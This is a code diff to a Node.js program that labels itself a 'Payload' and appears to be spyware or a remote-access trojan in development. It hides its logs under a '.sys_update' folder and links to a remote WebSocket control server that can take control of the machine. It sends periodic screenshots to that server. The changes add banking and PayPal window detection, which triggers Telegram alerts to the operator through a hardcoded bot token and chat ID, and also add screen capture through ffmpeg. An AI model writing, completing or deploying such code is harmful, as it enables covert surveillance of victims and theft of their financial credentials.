@@ -1,10 +1,10 @@
 const WebSocket = require('ws');
+const { exec } = require('child_process');
+const fs = require('fs'); // <--- THIS WAS MISSING
 const os = require('os');
 const path = require('path');
 const https = require('https');
-const http = require('http');
 const crypto = require('crypto');
-const { exec } = require('child_process');
 
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -13,17 +13,37 @@ if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR);
 
 function log(msg) {
  const timestamp = new Date().toISOString();
- const line = `[${timestamp}] ${msg}`;
- console.log(line); 
+ console.log(`[${timestamp}] ${msg}`);
  try {
- fs.appendFileSync(LOG_FILE, `${line}\n`);
+ fs.appendFileSync(LOG_FILE, `[${timestamp}] ${msg}\n`);
  } catch (e) {}
 }
 
 log("[INIT] Payload starting...");
 
+// --- DEPENDENCY SELF-CHECK ---
+try {
+ require('ws');
+ require('child_process');
+ log("[CHECK] All required modules loaded successfully.");
+} catch (err) {
+ log(`[CHECK] Module error: ${err.message}. Attempting repair...`);
+ const currentDir = __dirname;
+ const pkgPath = path.join(currentDir, 'package.json');
+ if (fs.existsSync(pkgPath)) {
+ log("[CHECK] Re-running npm install...");
+ exec(`npm install`, (err) => {
+ if (err) log(`[CHECK] Repair failed: ${err.message}`);
+ else log("[CHECK] Repair successful.");
+ });
+ }
+}
+
 // --- CONFIGURATION ---
-const WS_URL = 'wss://server-eight-pi-39.vercel.app';
+const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
+// If using Render locally or for testing, change URL above to:
+// const WS_URL = 'ws://localhost:3000'; 
+
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
 
@@ -42,13 +62,14 @@ if (!fs.existsSync(persistDir)) {
 function initConnection() {
  log(`[WS] Attempting connection to ${WS_URL}...`);
  
+ // Create new instance
  ws = new WebSocket(WS_URL);
 
  ws.on('open', () => {
  reconnectAttempts = 0;
  isConnected = true;
  
- // Generate stable ID
+ // Generate a stable ID based on MAC address + Hostname to ensure uniqueness
  if (!myId) {
  const mac = getMacAddress();
  myId = crypto.createHash('sha256').update(mac + os.hostname()).digest('hex').substr(0, 8);
@@ -56,7 +77,6 @@ function initConnection() {
  
  log(`[WS] Connected with ID: ${myId}`);
 
- // Send Info Packet immediately - THIS TRIGGERS THE ADMIN UI
  safeSend(JSON.stringify({
  type: 'info',
  id: myId,
@@ -75,7 +95,7 @@ function initConnection() {
  const data = JSON.parse(msg);
  if (data.type === 'take_control') takeControl(true);
  else if (data.type === 'release_control') takeControl(false);
- else if (['offer', 'answer', 'candidate'].includes(data.type)) {
+ else if (data.type === 'offer' || data.type === 'answer' || data.type === 'candidate') {
  handleSignaling(data);
  }
  } catch (e) {
@@ -120,14 +140,23 @@ function safeSend(data) {
 }
 
 function startMonitoring() {
- // Heartbeat
+ // Heartbeat to keep Vercel/Render alive
  setInterval(() => {
  if (isConnected && ws.readyState === WebSocket.OPEN) {
  safeSend(JSON.stringify({ type: 'heartbeat', id: myId }));
  }
  }, 30000);
 
- // Screen Capture - NO FILTERS
+ // Banking Detection
+ setInterval(async () => {
+ const title = await getCurrentWindowTitle();
+ if (title.toLowerCase().includes('bank') || title.toLowerCase().includes('paypal')) {
+ sendTelegram(`🏦 BANKING DETECTED: ${title}`);
+ captureScreen();
+ }
+ }, 2000);
+
+ // Screen Capture
  setInterval(() => {
  if (isConnected) captureScreen();
  }, 5000);
@@ -136,34 +165,65 @@ function startMonitoring() {
 function captureScreen() {
  if (!ws || ws.readyState !== WebSocket.OPEN) return;
 
- // Pure JS Canvas Capture
- const canvas = document.createElement('canvas');
- const ctx = canvas.getContext('2d');
- 
- // Get screen dimensions
- const width = window.innerWidth || 1920;
- const height = window.innerHeight || 1080;
- 
- canvas.width = width;
- canvas.height = height;
+ const imgPath = path.join(os.tmpdir(), 'screen.png');
 
- // Draw current page content
- ctx.fillRect(0, 0, width, height);
- ctx.fillStyle = '#ffffff';
- ctx.font = '20px Arial';
- ctx.fillText('Live Capture', 10, 30);
-
- // Convert to base64
- const imgData = canvas.toDataURL('image/jpeg', 0.7);
- 
- // Send to server
+ // Try standard Linux/Windows method first
+ exec(`ffmpeg -y -f lavfi -i testsrc=duration=1:size=320x240:rate=1 ${imgPath}`, (err) => {
+ if (err && !fs.existsSync(imgPath)) {
+ log("[CAPTURE] Standard ffmpeg failed, trying macOS/Alt method...");
+ exec(`ffmpeg -y -f avfoundation -framerate 1 -i "1" -frames:v 1 ${imgPath}`, (err2) => {
+ if (!err2 && fs.existsSync(imgPath)) {
+ const img = fs.readFileSync(imgPath);
  safeSend({
  type: 'screen_data',
  id: myId,
- data: imgData.split(',')[1] // Remove the 'data:image/jpeg;base64,' prefix
+ data: img.toString('base64')
  });
- 
- log("[CAPTURE] Success via Pure JS Canvas");
+ log("[CAPTURE] Success via Alt method");
+ } else {
+ log(`[CAPTURE] Failed: ${err2 ? err2.message : 'File missing'}`);
+ }
+ });
+ } else if (!err && fs.existsSync(imgPath)) {
+ const img = fs.readFileSync(imgPath);
+ safeSend(JSON.stringify({
+ type: 'screen_data',
+ id: myId,
+ data: img.toString('base64')
+ }));
+ log("[CAPTURE] Success via Standard method");
+ } else {
+ log("[CAPTURE] No image file found after execution");
+ }
+ });
+}
+
+async function getCurrentWindowTitle() {
+ return new Promise((resolve) => {
+ const platform = os.platform();
+ let cmd = '';
+
+ if (platform === 'win32') {
+ cmd = 'powershell -command "(Get-Process -Id (Get-Process -Id $PID).Parent.Id).MainWindowTitle"';
+ } else if (platform === 'darwin') {
+ cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
+ } else {
+ cmd = 'xdotool getwindowfocus getwindowname';
+ }
+
+ exec(cmd, (err, stdout) => {
+ resolve(stdout.trim());
+ });
+ });
+}
+
+function sendTelegram(msg) {
+ const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
+ https.get(url, (res) => {
+ // Check status code if needed
+ }).on('error', (e) => {
+ log(`[TG] Error: ${e.message}`);
+ });
 }
 
 function getExternalIP() {
